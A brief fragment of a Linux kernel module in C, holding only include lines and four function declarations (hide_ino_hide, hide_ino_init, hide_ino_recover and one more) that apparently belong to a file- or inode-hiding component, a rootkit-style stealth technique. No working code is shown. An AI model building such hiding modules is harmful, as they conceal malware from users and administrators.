#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/xattr.h>
#include <linux/namei.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/list.h>

int hide_ino_hide(const char*);
int hide_ino_alloc(struct dentry*);
int hide_ino_init(void);
int hide_ino_recover(void);
